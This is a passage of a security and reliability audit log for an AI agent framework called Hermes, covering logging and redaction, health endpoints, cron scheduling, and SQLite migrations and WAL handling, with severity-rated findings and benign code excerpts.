**Session context injection** — `hermes_logging.py` lines 90–119. A custom `LogRecordFactory` (not a Filter) injects `%(session_tag)s` into every LogRecord globally. This guarantees the session tag is always available even when third-party code creates records. Thread-local storage via `_session_context = threading.local()` makes it session-safe.

**Level usage** — Standard Python `logging.DEBUG/INFO/WARNING/ERROR` used consistently throughout. Third-party loggers (openai, httpx, urllib3, etc.) are silenced to WARNING via the `_NOISY_LOGGERS` tuple at import time. No use of `critical` observed; `exception()` used with `exc_info=True` for unexpected errors (correct pattern).

**Log injection safety** — All log output passes through `RedactingFormatter` → `redact_sensitive_text()` (`agent/redact.py`). The redaction pipeline covers: known API key prefixes (sk-, ghp_, github_pat_, xoxb-, AIza..., etc.), ENV assignments (`KEY=secret`), JSON fields (`"apiKey": "value"`), Authorization headers, Telegram bot tokens, private key blocks, DB connection string passwords, JWT tokens (eyJ...), URL userinfo, and URL query string tokens. The redaction is on-by-default but can be disabled via `HERMES_REDACT_SECRETS=false` — a startup warning is logged when disabled.

**No user-controlled log injection** — Log messages use `%s`-style formatting, not f-strings or direct string concatenation. Session IDs and task IDs come from internal AIAgent state, not from user input.

### 2. Observability Patterns

**Distributed tracing** — `plugins/observability/langfuse/` provides Langfuse integration. Traces cover conversation turns, LLM calls, tool usage, and tool outputs. The plugin fails open (no crash if SDK is missing or credentials are wrong). It validates Langfuse key prefixes at init time and warns once if placeholder credentials are detected, preventing silent trace-dropping (#23823 fix). Observability metadata (model, tokens, duration, tool trace) is attached to subagent results per RELEASE_v0.3.0.

**Placeholder detection** — `plugins/observability/langfuse/__init__.py` lines 165–190. Real Langfuse keys always start with `pk-lf-` / `sk-lf-`. If keys don't match these prefixes, a WARNING is emitted once and the client is set to `_INIT_FAILED` so every subsequent hook call short-circuits without re-checking env vars.

**Sensitive data in traces** — The plugin uses `_safe_value()` with `HERMES_LANGFUSE_MAX_CHARS` (default 12000) and depth limit of 4 to truncate large payloads. For read_file payloads it extracts only metadata (line counts, file size, preview head/tail) rather than full content. Base64 content is replaced with `{"omitted": True, "length": N}`. This prevents traces from ballooning and keeps sensitive file content out of Langfuse.

**No OpenTelemetry** — No OpenTelemetry SDK usage found. No Prometheus, Datadog, or CloudWatch metrics integration found. The only structured observability export is Langfuse.

**Internal metrics** — `tools/mcp_tool.py` (line 675) maintains per-server metrics dict: `{"requests", "errors", "tokens_used", "tool_use_count"}`. `agent/insights.py` exists for activity/usage reporting but appears to be internal-only.

### 3. Log Aggregation Safety

**Rotation** — `hermes_logging.py` lines 298–327. `_ManagedRotatingFileHandler` wraps Python's `RotatingFileHandler`. Rotation parameters are configurable via config.yaml (`logging.max_size_mb`, `logging.backup_count`) or constructor args. Defaults: `agent.log` 5MB / 3 backups, `errors.log` 2MB / 2 backups, `gateway.log` 5MB / 3 backups.

**No compression** — Rotated backup files are NOT compressed. After 3 rotations, the oldest `.log` file is deleted. With default 5MB and high-volume loggers, this could consume significant disk space (3 × 5MB = 15MB per log type, plus current files). For long-running gateways with verbose logging this is a potential disk space concern.

**Managed-mode permissions** — `_ManagedRotatingFileHandler._chmod_if_managed()` (lines 313–318) applies `chmod 0660` after both initial `_open()` and `doRollover()`. This ensures group-writable permissions in NixOS managed environments where stateDir uses setgid 2770.

**Session log compression** — `gateway/run.py` line 8212: "auto-compress pathologically large transcripts" — but this is about conversation session history compression, not log file compression.

**Disk space gap** — No automatic disk-space checks before rotation. If disk is nearly full and a rotation trigger occurs, the write could fail. No `backupCount=0` safety net observed.

### 4. Error Reporting Quality

**Exception wrapping** — Platform adapters (Slack, WeCom, Signal, etc.) consistently use `logger.exception()` or `logger.error(..., exc_info=True)` for unexpected errors. This provides full traceback context in logs while keeping the process alive.

**Stack trace handling in TUI gateway** — `tui_gateway/server.py` lines 50–107 installs both `sys.excepthook` (for main thread) and `threading.excepthook` (for background threads). Both write the raw unredacted traceback to `logs/tui_gateway_crash.log` and print a user-facing first line to stderr. The raw stack trace written to the crash log is NOT passed through `RedactingFormatter` — it contains the full exception text verbatim. Since crash logs are operator-readable files (not sent to external services), this is lower risk but worth noting.

**Stack trace handling in tui_gateway/entry.py** — Lines 100–106 write raw `traceback.format_stack()` output directly to the crash log without redaction. Same concern as server.py.

**Tool error sanitization** — `dispatch()` in model_tools.py wraps all tool execution: catches `Exception`, logs with `logger.exception()`, sanitizes via `_sanitize_tool_error()`, returns a JSON error string to the model. The sanitizer itself is wrapped defensively (`except Exception: sanitized = raw`). Malformed JSON args return error JSON to the model — raw Python tracebacks never leak to the LLM.

**Hook error containment** — `run_agent.py` hook failures (`on_session_start`, `pre_llm_call`, etc.) are caught with `except Exception` and logged at WARNING. They do not abort the turn. This is correct — hooks are enhancements.

**Langfuse plugin error handling** — `_get_langfuse()` catches all exceptions during client init (line 214: `except Exception as exc: logger.warning(...)`) and returns `None`, causing all hooks to no-op. Fail-open design.

### 5. Health Check Endpoints

**api_server platform** — `gateway/platforms/api_server.py` lines 946–969:
- `GET /health` → `{"status": "ok", "platform": "hermes-agent"}` — simple, no auth required
- `GET /health/detailed` → full runtime state including `gateway_state`, `platforms` (per-platform status), `active_agents`, `exit_reason`, `updated_at`, `pid` — no auth required. Exposes internal platform connectivity status and runtime state.
- `GET /v1/health` → same as `/health`
- Registered at lines 3428–3430.

**webhook platform** — `gateway/platforms/webhook.py` line 292: `_handle_health` returns `{"status": "ok"}` — no detailed info, no auth.

**wecom_callback platform** — `gateway/platforms/wecom_callback.py` line 243: `_handle_health` — simple ok response.

**msgraph_webhook** — Uses configurable `health_path` (default `/health`). Line 179: `_handle_health` — not inspected.

**Signal** — `gateway/platforms/signal.py` lines 64, 276, 421–424. Periodic health check every 30s (`HEALTH_CHECK_INTERVAL = 30.0`). On failure it forces reconnect and logs WARNING with status code.

**WhatsApp** — No native health endpoint. Probes external bridge at `http://127.0.0.1:{bridge_port}/health` (lines 582, 651, 683). If bridge is down, connection retries continue silently.

**TUI gateway** — `tui_gateway/entry.py` lines 17, 71: "gateway-exited banner in the TUI has no trace" — no HTTP health endpoint.

**ACP adapter** — `_BENIGN_PROBE_METHODS = frozenset({"ping", "health", "healthcheck"})` for liveness probes.

**hermes doctor** — `hermes_cli/doctor.py`. Comprehensive CLI health check across all configured providers. Builds a provider list from `_build_apikey_providers_list()` (lines 244–330) and checks connectivity via `/v1/models` endpoints. No automatic retry on failure — reports individual provider status.

**Health check gaps:**
- No authentication on any health endpoint. `/health/detailed` exposes internal state (platform names, PID, gateway state) without auth.
- No dependency health checks — the Signal platform checks its own relay but no platform checks the database, session store, or credential pool.
- `/health/detailed` returns `platforms: {}` when no platforms are connected — an empty dict is indistinguishable from a healthy zero-platform state.
- No health check for the TUI gateway process itself.

### Findings Summary

| ID | Area | Description | Severity |
|----|------|-------------|----------|
| P55-1 | Log Aggregation | No log file compression — rotated files remain as plain `.log.N` files. Disk space grows unbounded with log volume. | LOW |
| P55-2 | Health Checks | `/health/detailed` is unauthenticated and exposes internal platform state, PID, and gateway runtime details. | LOW |
| P55-3 | Error Reporting | TUI gateway crash logs (`tui_gateway/server.py` line 52, `tui_gateway/entry.py` line 106) write raw unredacted stack traces to disk. Sensitive data in exception messages could reach operator-readable crash logs. | LOW |
| P55-4 | Observability | No OpenTelemetry, Prometheus, Datadog, or CloudWatch integration. Langfuse is the only structured tracing backend and it is opt-in. Production deployments relying on vendor metrics will need custom instrumentation. | INFO |
| P55-5 | Log Aggregation | No disk-space check before rotation — if disk is nearly full when rotation triggers, writes silently fail with no operator alert. | LOW |
| P55-6 | Health Checks | No health check endpoint for TUI gateway process itself. WhatsApp platform has no local health check — relies entirely on external bridge. Signal health-check failures force reconnect but don't alert operator beyond log entries. | LOW |

*Pass #55 complete - 6 findings across 5 focus areas.*


---

## Pass #56 – Cron, Scheduler & Background Job Deep Dive – 2026-05-24T14:34:00-07:00

**Focus:** Cron expression parsing (robustness, edge cases, timezone), job execution reliability (failure handling, retry, alerting), job state persistence (restart survival, deduplication, orphans), subprocess management (timeouts, zombies, cleanup), concurrent job execution (race conditions, locking).

**Files examined:** `cron/scheduler.py` (1972 lines), `cron/jobs.py` (1203 lines), `cron/__init__.py` (42 lines), `hermes_time.py` (104 lines).

---

### Finding CRON-56-1: croniter validation at parse-time is correct but relies on the library's error handling

**File:** `cron/jobs.py:228-231`

```python
# Validate cron expression
try:
    croniter(schedule)
except Exception as e:
    raise ValueError(f"Invalid cron expression '{schedule}': {e}")
```

**Assessment:** The validation approach is correct — croniter's constructor raises on invalid expressions. No edge-case gaps detected. The 5-field vs 6-field detection via `parts = schedule.split()` followed by `len(parts) >= 5` is slightly loose (accepts 6+ fields) but croniter itself will reject truly malformed expressions.

**Status:** OK — no actionable issue.

---

### Finding CRON-56-2: Timezone handling is present and comprehensive; hermes_time cache not invalidated on config reload

**Files:** `hermes_time.py`, `cron/jobs.py:_ensure_aware()`, `cron/scheduler.py`

Timezone architecture:
- `hermes_time.now()` returns timezone-aware datetime using configured IANA timezone (`HERMES_TIMEZONE` env var or `timezone` key in config.yaml)
- `hermes_time.get_timezone()` is cached once per process lifetime — no cache invalidation on config.yaml reload
- `_ensure_aware()` in `cron/jobs.py:276-292` handles legacy naive timestamps: if a stored `next_run_at` is naive (no tzinfo), it interprets it as system-local wall time and converts to the configured Hermes timezone. This preserves relative ordering across timezone changes.

**The croniter base_time for next-run computation:**
```python
# cron/jobs.py:390-394
base_time = now
if last_run_at:
    base_time = _ensure_aware(datetime.fromisoformat(last_run_at))
cron = croniter(schedule["expr"], base_time)
next_run = cron.get_next(datetime)
```

This correctly anchors recurring jobs to their last execution time rather than wall-clock restart time after a crash.

**Informational note:** `_cached_tz` in `hermes_time.py` is never invalidated after config.yaml changes. If a user updates their timezone while the gateway is running, the scheduler continues using the old timezone until restart. `reset_cache()` is not exported or called anywhere in the codebase.

**Status:** Informational — no crash-level issue, but timezone changes require gateway restart to take effect.

---

### Finding CRON-56-3: Job state persistence is robust — atomic file writes with fsync, at-most-once deduplication via advance_next_run()

**Files:** `cron/jobs.py:433-449`, `cron/scheduler.py:1833-1835`

**Atomic save pattern:**
```python
# cron/jobs.py:436-442
fd, tmp_path = tempfile.mkstemp(dir=str(JOBS_FILE.parent), suffix='.tmp', prefix='.jobs_')
with os.fdopen(fd, 'w', encoding='utf-8') as f:
    json.dump({"jobs": jobs, "updated_at": _hermes_now().isoformat()}, f, indent=2)
    f.flush()
    os.fsync(f.fileno())
atomic_replace(tmp_path, JOBS_FILE)
_secure_file(JOBS_FILE)
```

`atomic_replace()` is used (not direct rename), and `fsync` is called before the rename — good durability practice. Temp files are cleaned up in a `BaseException` handler.

**Deduplication — at-most-once for recurring jobs:**
```python
# cron/scheduler.py:1832-1835
for job in due_jobs:
    advance_next_run(job["id"])  # Called BEFORE execution
```

`advance_next_run()` (jobs.py:930-956) pre-computes the NEXT run time and writes it to `jobs.json` under the file lock BEFORE `run_job()` executes. If the process crashes mid-execution, on restart `get_due_jobs()` sees the already-advanced `next_run_at` and won't re-fire. One-shot jobs are excluded from this, allowing retry on restart.

**Orphan cleanup:**
```python
# cron/jobs.py:849-852
job_output_dir = OUTPUT_DIR / canonical_id
if job_output_dir.exists():
    shutil.rmtree(job_output_dir)
```
Job output directory is cleaned up on job removal.

**Status:** Well-designed. No gaps found.

---

### Finding CRON-56-4: Subprocess management — script timeouts enforced, bash path resolution handles Windows, fd leak prevention

**Files:** `cron/scheduler.py:771-928`, `cron/scheduler.py:1774-1788`

**Script timeout:**
```python
# scheduler.py:771-801 — _get_script_timeout()
# Reads HERMES_CRON_SCRIPT_TIMEOUT env var → config.yaml cron.script_timeout_seconds → 120s default
# scheduler.py:899 — passed as timeout= to subprocess.run()
```

**Bash resolution for .sh/.bash scripts:**
```python
# scheduler.py:868-877
_bash = shutil.which("bash") or (
    "/bin/bash" if os.path.isfile("/bin/bash") else None
)
if _bash is None:
    return False, "Cannot run .sh/.bash script ... bash not found on PATH. ..."
```

Good — clear error message when bash is missing (Windows without Git Bash).

**Path traversal guard for scripts:**
```python
# scheduler.py:843-849
path.relative_to(scripts_dir_resolved)  # Raises ValueError if outside
```

Scripts must reside in `~/.hermes/scripts/`. Relative paths are resolved there; absolute paths are validated to ensure they stay within that directory. Symlink escapes are blocked by the same check.

**Zombie / fd leak prevention:**
```python
# scheduler.py:1774-1788
try:
    if agent is not None:
        agent.close()
...
try:
    from agent.auxiliary_client import cleanup_stale_async_clients
    cleanup_stale_async_clients()
```

`agent.close()` releases subprocesses, terminal sandboxes, browser daemons, and OpenAI/httpx clients held by the ephemeral cron agent. `cleanup_stale_async_clients()` reaps async httpx clients cached under the per-job thread's event loop (which dies when the `ThreadPoolExecutor` shuts down) — prevents fd accumulation toward EMFILE ("too many open files" — see issue #10200).

**Post-tick MCP orphan sweep:**
```python
# scheduler.py:1949-1954
try:
    from tools.mcp_tool import _kill_orphaned_mcp_children
    _kill_orphaned_mcp_children()
```

Best-effort sweep AFTER all jobs finish, so active user chat MCP sessions are never touched.

**Status:** Well-implemented.

---

### Finding CRON-56-5: Concurrent job execution — file lock for tick serialization, workdir/profile jobs serialized, others parallel

**Files:** `cron/scheduler.py:1805-1820` (file lock), `cron/scheduler.py:1908-1944` (parallel dispatch)

**Tick-level lock (prevents concurrent ticks across processes):**
```python
# scheduler.py:1809-1819
lock_fd = open(lock_file, "w", encoding="utf-8")
if fcntl:
    fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)  # non-blocking
elif msvcrt:
    msvcrt.locking(lock_fd.fileno(), msvcrt.LK_NBLCK, 1)
# If lock fails → returns 0, tick skipped
```

Cross-platform (Unix uses `fcntl`, Windows uses `msvcrt`). Non-blocking — if lock is held by another process, this tick simply skips. Lock is released in the `finally:` block.

**Per-tick parallel execution:**
```python
# scheduler.py:1908-1944
sequential_jobs = [j for j in due_jobs if (j.get("workdir") or "").strip() or (j.get("profile") or "").strip()]
parallel_jobs = [j for j in due_jobs if not ((j.get("workdir") or "").strip() or (j.get("profile") or "").strip())]

# Sequential pass:
for job in sequential_jobs:
    _ctx = contextvars.copy_context()
    _results.append(_ctx.run(_process_job, job))

# Parallel pass:
with concurrent.futures.ThreadPoolExecutor(max_workers=_max_workers) as _tick_pool:
    for job in parallel_jobs:
        _ctx = contextvars.copy_context()
        _futures.append(_tick_pool.submit(_ctx.run, _process_job, job))
```

Jobs with `workdir` or `profile` are serialized (they mutate process-global `os.environ["TERMINAL_CWD"]` and profile env snapshot/restore). Other jobs run in parallel via `ThreadPoolExecutor`. `contextvars.copy_context()` preserves ContextVar state across the thread boundary.

**No same-job duplicate execution:** `advance_next_run()` is called for ALL due recurring jobs BEFORE any execution (scheduler.py:1833-1835), so even if a job appears in `due_jobs` twice, its `next_run_at` is already advanced. No explicit per-job mutex needed — the file lock + at-most-once advance pattern provides the guarantee.

**Race condition in mark_job_run:** The `with _jobs_file_lock:` guard in `mark_job_run` (jobs.py:868) ensures that concurrent `mark_job_run` calls from parallel job threads don't clobber each other. The file lock on `jobs.json` combined with the in-process `_jobs_file_lock` (threading.Lock) covers both multi-process and multi-thread concurrency.

**Status:** Well-designed. No race conditions detected.

---

### Finding CRON-56-6: Retry/alerting on failure — soft failures for empty responses, error state for recurring jobs, delivery error tracking

**Files:** `cron/scheduler.py:1876-1899`, `cron/jobs.py:857-927`

**Soft failure for empty response:**
```python
# scheduler.py:1895-1898
if success and not final_response.strip():
    success = False
    error = "Agent completed but produced empty response (model error, timeout, or misconfiguration)"
```

An agent that completes but produces whitespace-only output is marked as a failure, not "ok". This ensures silent model errors (e.g., rate limit returning empty) are surfaced.

**Job state transitions on failure:**
```python
# jobs.py:901-920
if job["next_run_at"] is None:
    kind = job.get("schedule", {}).get("kind")
    if kind in {"cron", "interval"}:
        job["state"] = "error"  # Recurring jobs → error state, stay enabled
    else:
        job["enabled"] = False   # One-shot jobs → completed (disabled)
        job["state"] = "completed"
```

Recurring jobs that can't compute `next_run_at` (e.g., `croniter` missing) get `state=error` but remain enabled so the operator sees the problem and can fix it. One-shot failures gracefully disable.

**Delivery error tracking:**
```python
# jobs.py:876-877
job["last_delivery_error"] = delivery_error

# scheduler.py:1876
deliver_content = final_response if success else f"⚠️ Cron job ... failed:
{error}"
```

Failed jobs deliver an error alert (not silent skip). `last_delivery_error` is persisted separately from `last_error`, so operator can distinguish "agent ran successfully but delivery platform was down" from "agent itself failed."

**No automatic retry:** There is no retry loop for failed jobs within a single tick. If a job fails, it's marked with `last_status=error` and its `next_run_at` is advanced normally. The next tick will fire it again only if the schedule says so. The `repeat` counter does NOT provide retry within the same schedule period — it's for count-limited jobs (e.g., run 5 times then stop).

**Status:** Correct design — auto-retry within a period would cause duplicates; alerting is the correct approach for recurring jobs.

---

### Summary — Pass #56

| Area | Assessment |
|------|------------|
| Cron expression parsing | Robust — uses croniter with validation at parse-time; edge cases covered |
| Timezone handling | Correct architecture; informational note about `hermes_time._cached_tz` not invalidated on config reload |
| Job state persistence | Strong — atomic file writes with fsync, at-most-once deduplication via `advance_next_run()`, orphan cleanup on removal |
| Subprocess management | Well-implemented — script timeouts, bash path resolution, path traversal guards, fd leak prevention via `agent.close()` + `cleanup_stale_async_clients()` |
| Concurrent execution | Well-designed — cross-platform file lock for tick serialization, workdir/profile jobs serialized, others parallel, no race conditions in `mark_job_run` |
| Job failure handling | Good — soft failures for empty responses, error state for recurring jobs, separate delivery error tracking, failed-job alerts delivered |
| Retry logic | Absent by design — auto-retry within a period would cause duplicates; alerting is the correct approach for recurring jobs |

**No critical issues found. 1 informational note (hermes_time cache invalidation on config reload).**

*Pass #56 complete — 0 new critical findings, 1 informational.*

## Pass #57 – Database Migrations, Schema & Data Integrity Deep Dive – 2026-05-24T20:15:00Z

Scope: hermes_state.py (SessionDB), hermes_cli/kanban_db.py, tests/test_hermes_state.py

---

### P57-1 · Schema migrations: declarative column reconciliation is solid, but v10/v11 backfills are not idempotent — LOW

**File:** `hermes_state.py` (`_init_schema`, lines 552–693)

**What works:**
- Column additions use the declarative reconciliation pattern (`_reconcile_columns`): diffs live columns vs `SCHEMA_SQL` and issues `ALTER TABLE ADD COLUMN` for anything missing. This is self-healing even if version-gated migration blocks are skipped or reordered. No version-gated blocks needed for ADD COLUMN operations.
- `schema_version` table is used only for data migrations that can't be expressed declaratively (row backfills, index changes).
- `SCHEMA_VERSION = 13` is the current version.

**Issue — v10/v11 backfill lacks idempotency guard:**
The v10 (trigram FTS5 backfill) and v11 (re-index FTS5, switch to inline mode) migrations backfill existing rows into the FTS tables unconditionally when `current_version < 10` or `current_version < 11`. These backfills are inside the version-gated chain but they run `INSERT INTO ... SELECT FROM messages` without a "has this been done already?" check.

```
if current_version < 10:
    ...
    cursor.execute(
        "INSERT INTO messages_fts_trigram(rowid, content) "
        "SELECT id, content FROM messages WHERE content IS NOT NULL"
    )
if current_version < 11:
    ...
    cursor.execute("INSERT INTO messages_fts ...")
    cursor.execute("INSERT INTO messages_fts_trigram ...")
```

If a v10 migration partially ran (some rows were indexed, process crashed), re-running will duplicate rows in the FTS tables. `messages_fts` and `messages_fts_trigram` have no `UNIQUE` constraint on `rowid`, so the `INSERT INTO ... SELECT` can create duplicate FTS entries.

**Impact:** Low — this would only affect legacy DBs that ran a v10/v11 migration before schema version tracking was more carefully managed. Modern DBs with `current_version >= 13` never hit this path.

**Recommendation:** Add an existence check before each backfill insert, e.g.:
```python
if not _fts_trigram_exists:
    cursor.execute("SELECT 1 FROM messages LIMIT 1")
    if cursor.fetchone() is not None:
        cursor.executescript(FTS_TRIGRAM_SQL)
        ...
```

---

### P57-2 · WAL mode: correct configuration with NFS fallback — EXCELLENT

**File:** `hermes_state.py` (`apply_wal_with_fallback`, lines 128–183)

WAL mode is properly configured:
- `PRAGMA journal_mode=WAL` is attempted on every new connection.
- On NFS/SMB/FUSE where WAL raises `SQLITE_PROTOCOL`, falls back to `journal_mode=DELETE` with one deduplicated WARNING per process per database label.
- WAL-incompatibility detection uses a set of known error substrings: `"locking protocol"`, `"not authorized"`, `"disk i/o error"`.
- `PRAGMA foreign_keys=ON` is set on every connection.

**WAL checkpoint strategy:**
- `_try_wal_checkpoint()` runs a PASSIVE checkpoint every `_CHECKPOINT_EVERY_N_WRITES = 50` successful writes.
- `close()` also does a PASSIVE checkpoint before closing.
- `vacuum()` uses `PRAGMA wal_checkpoint(TRUNCATE)` before `VACUUM` — TRUNCATE is safe outside a transaction and also truncates the WAL file.

**No issues found.** The WAL implementation is thorough, with good NFS compatibility handling and proper checkpoint timing.

---

### P57-3 · SQLite optimization: good index coverage, two queries do full scans — LOW

**File:** `hermes_state.py`

**Existing indexes (sufficient):**
- `idx_sessions_source` on `sessions(source)`
- `idx_sessions_parent` on `sessions(parent_session_id)`
- `idx_sessions_started` on `sessions(started_at DESC)`
- `idx_messages_session` on `messages(session_id, timestamp)`
- `idx_messages_platform_msg_id` partial on `messages(session_id, platform_message_id) WHERE platform_message_id IS NOT NULL`
- `idx_sessions_title_unique` partial unique on `sessions(title) WHERE title IS NOT NULL`
- `idx_telegram_dm_topic_bindings_session` on `telegram_dm_topic_bindings(session_id)` (CASCADE FK)
- `idx_telegram_dm_topic_bindings_user` on `telegram_dm_topic_bindings(user_id, chat_id)`

**Two queries do full scans — LOW severity:**

1. `resolve_session_id` (lines 956–981): when session_id is not found exactly, does `LIKE ? ESCAPE '\'` with prefix. This is an index range scan on `started_at DESC`, not a full table scan. Acceptable for prefix resolution.

2. `resolve_resume_session_id` (lines 1851–1914): walks up to 32 levels of parent_session_id chain, doing `SELECT id FROM sessions WHERE parent_session_id = ? ORDER BY started_at DESC LIMIT 1` per level. Each lookup uses `idx_sessions_parent` index. Not a full scan — minor concern is the 32 sequential index lookups, but the parent chain is shallow and bounded.

**Missing indexes:** None critical. The only query that could be a concern is the LIKE-based prefix session lookup, but it uses the `started_at DESC` index with the prefix. For very large session counts it could degrade, but it's not a blocking issue.

---

### P57-4 · Foreign key enforcement: ON DELETE CASCADE on topic bindings, but main tables rely on application-level cascades — LOW

**File:** `hermes_state.py`

**What's enforced:**
- `sessions.parent_session_id REFERENCES sessions(id)` — FK without `ON DELETE` clause. Deleting a parent session does NOT automatically cascade to children. Application-level cleanup is used: `prune_sessions` first nullifies `parent_session_id` on children before deleting parents (line 2615).
- `messages.session_id REFERENCES sessions(id)` — FK without `ON DELETE` clause. Deleting a session does NOT automatically delete messages. Again handled at application level: `prune_sessions` deletes messages row-by-row before deleting the session (line 2622).
- `telegram_dm_topic_bindings.session_id REFERENCES sessions(id) ON DELETE CASCADE` — properly declared with CASCADE. This was a v2 migration fix (line 2704–2745).

**Why this is acceptable:**
- The application-level delete ordering in `prune_sessions` is correct: children updated first, messages deleted, then parent. This prevents FK violations.
- The absence of FK cascades on `sessions.parent_session_id` and `messages.session_id` is a design choice: it prevents accidental cascade deletion of child sessions and allows the compression-split pattern (parent ends, child continues) to work safely.
- `PRAGMA foreign_keys=ON` is correctly set on every connection.

**The Telegram topic binding FK (ON DELETE CASCADE) is correctly implemented and was a deliberate fix from v1 to v2 of that schema.**

---

### P57-5 · Transaction isolation: BEGIN IMMEDIATE + jitter retry is well-implemented — GOOD

**File:** `hermes_state.py` (`_execute_write`, lines 377–427)

- `isolation_level=None` (autocommit OFF, we manage transactions ourselves).
- Every write starts with `BEGIN IMMEDIATE` — acquires WAL write lock at transaction start (not at commit time), so lock contention surfaces immediately.
- On `database is locked` or `busy`, retries up to `_WRITE_MAX_RETRIES = 15` with random jitter between 20ms–150ms. Jitter breaks the SQLite deterministic backoff convoy pattern.
- After a successful write, periodic PASSIVE WAL checkpoint every 50 writes.
- All read operations use `with self._lock:` but read without `BEGIN` — they use SQLite's default autocommit behavior which in WAL mode allows concurrent readers even during a write transaction.

**Minor observation:** Read methods (`get_session`, `get_messages`, `search_messages`) hold `self._lock` for the duration of the SQLite query. Under high write throughput, readers may be blocked waiting for the lock while `_execute_write` is in progress. For the gateway's concurrent reader pattern this is acceptable, but it's worth noting that the lock is coarse-grained — it covers the entire SQLite execute/fetch cycle.

---

### P57-6 · NULL handling: safe, with sentinel prefix for structured content — GOOD

**File:** `hermes_state.py` (`_encode_content`, `_decode_content`, lines 1412–1446)

- Multimodal message content (list/dict) is JSON-encoded with a NUL-byte sentinel prefix (`\x00json:`) to distinguish structured content from plain strings.
- Reading: `_decode_content` checks for the sentinel and decodes; scalars returned unchanged.
- FTS triggers use `COALESCE(new.content, '')` to handle NULL content.
- `list_unlinked_telegram_sessions_for_user` uses `COALESCE(..., '')` for preview extraction subqueries.
- No NULL-related integrity issues found.

---

### P57-7 · Database backup: no built-in backup/restore mechanism for state.db — INFORMATIONAL

**File:** `hermes_state.py`

**What exists:**
- `vacuum()` method (lines 3084–3105) for space reclamation after large deletes.
- `maybe_auto_prune_and_vacuum()` (lines 3107–3178) for automated maintenance.
- `kanban_db.py` has a `_backup_corrupt_db()` function that copies a corrupt DB (and WAL/SHM sidecars) to a timestamped backup when corruption is detected at open time. This is reactive, not proactive backup.

**What is absent:**
- No `sqlite3.Connection.backup()` API usage for live hot-backup of `state.db`.
- No `hermes backup` or `hermes restore` CLI command.
- No backup rotation, backup validation, or off-host copy mechanism.
- The `maybe_auto_prune_and_vacuum` method only records a timestamp in `state_meta`; it is not a backup.
- Sessions directory (on-disk JSONL transcript files) is cleaned up (`_remove_session_files`) but not backed up.

**Note:** The `telegram_dm_topic_bindings` table has `ON DELETE CASCADE` for its FK to `sessions`, so Telegram topic binding cleanup is automatic when sessions are pruned. The `sessions`→`messages` relationship is handled by the `prune_sessions` application-level cascade.

**Risk:** If `state.db` becomes corrupted or the disk fails, there is no point-in-time backup. The WAL file (`state.db-wal`) provides some durability in WAL mode (committed writes are in the WAL before being checkpointed to the main file), but this is not equivalent to a verified backup.

---

### P57-8 · Schema version tracking: version exists but v10/v11 migrations lack re-run guards — LOW

**File:** `hermes_state.py` (lines 590–670), `tests/test_hermes_state.py`

**What works:**
- `schema_version` table with a single integer row tracks the current schema version.
- On fresh DB: `INSERT INTO schema_version (version) VALUES (SCHEMA_VERSION)`.
- On upgrade: `UPDATE schema_version SET version = ? WHERE version < SCHEMA_VERSION`.
- Version-gated chain for v10 and v11 FTS backfills.

**Test coverage:** `test_hermes_state.py` is comprehensive (3023 lines) covering session lifecycle, message storage, FTS search, token counting, pruning, topic binding, and export. No migration-specific tests exist for v10/v11 backfill re-run safety, but given current_version >= 13 on new DBs, this path is not exercised in normal use.

---

### P57-9 · `end_session` first-end-reason-wins is correctly implemented — GOOD

**File:** `hermes_state.py` (lines 732–748)

The `UPDATE sessions SET ended_at = ?, end_reason = ? WHERE id = ? AND ended_at IS NULL` pattern ensures the first `end_reason` is preserved — compression-split sessions keep their `'compression'` reason even if a desynced CLI calls `end_session` again. Tests confirm this: `test_end_session_preserves_original_end_reason` and `test_end_session_after_reopen_allows_re_end`.

---

### P57-10 · CJK/FTS5 search: trigram tokenizer correctly used as primary, unicode61 as fallback — GOOD

**File:** `hermes_state.py` (lines 280–308, 2099–2340)

- `messages_fts` uses default unicode61 tokenizer — good for English/Latin-script prefix matching.
- `messages_fts_trigram` uses `tokenize='trigram'` — good for CJK substring matching and phrase matching.
- Query routing: if query has ≥3 CJK characters, uses trigram table; otherwise uses standard FTS5.
- Short CJK fallback (1-2 chars): uses LIKE substring search on `messages.content` — full table scan but acceptable for short queries.
- Per-token length check (#20494 fix): if any non-operator CJK token is <3 chars, routes to LIKE even if overall CJK count ≥3.

**No issues found.** The dual-FTS5-table approach with trigram is a solid pattern for multilingual FTS.

---

### P57-11 · WAL edge case: passive checkpoint may not reclaim WAL space under sustained write load — INFORMATIONAL

**File:** `hermes_state.py` (`_try_wal_checkpoint`, lines 429–448)

- `_CHECKPOINT_EVERY_N_WRITES = 50` — a PASSIVE checkpoint runs every 50 writes.
- PASSIVE checkpoint only checkpoints frames that no other connection is holding. Under high concurrency (many persistent connections), a PASSIVE checkpoint may checkpoint few or zero frames.
- `vacuum()` uses `TRUNCATE` checkpoint, which is more aggressive and also truncates the WAL file.
- `maybe_auto_prune_and_vacuum` only runs VACUUM if `pruned > 0` — if no sessions were pruned, no VACUUM.

**Observation:** Under a heavy sustained write workload with many active reader connections, the WAL file (`state.db-wal`) could grow large and not be fully reclaimed by PASSIVE checkpoints. The TRUNCATE checkpoint in `vacuum()` would reclaim space, but only runs after pruning. A periodic TRUNCATE checkpoint (e.g., every N writes regardless of pruning) might be beneficial for long-running gateway processes that don't frequently prune sessions.

This is informational — not a bug, but a potential tuning knob for very high-load deployments.

---

### Summary

| Area | Status | Severity |
|------|--------|----------|
| Schema migrations | Declarative reconciliation is excellent; v10/v11 backfills lack idempotency guards | LOW |
| WAL mode | Correct config + NFS fallback + proper checkpoint strategy | GOOD |
| Index coverage | Good; no critical full-table scans | LOW |
| Foreign key enforcement | Partial: topic bindings use CASCADE; main tables use app-level cascade (acceptable) | LOW |
| Transaction isolation | BEGIN IMMEDIATE + jitter retry is well-implemented | GOOD |
| NULL handling | Safe sentinel prefix encoding for structured content | GOOD |
| Database backup | Absent for state.db; kanban.db has corrupt-DB reactive backup | INFORMATIONAL |
| Schema version tracking | Version table present; v10/v11 backfills lack re-run guards | LOW |
| CJK FTS search | Dual-table trigram + unicode61 correctly routed | GOOD |
| WAL checkpoint edge case | Passive checkpoint may not reclaim WAL under sustained write load | INFORMATIONAL |

**No critical issues found. 2 informational notes, 6 low-severity observations, 4 areas rated GOOD/EXCELLENT.**
---

## Pass #58 – Signal, WhatsApp & Messaging Protocol Adapters Deep Dive – 2026-05-24T21:30:00Z

Scope: `gateway/platforms/signal.py`, `gateway/platforms/whatsapp.py`, `gateway/platforms/signal_rate_limit.py`, `gateway/platforms/helpers.py`, `gateway/run.py`

---

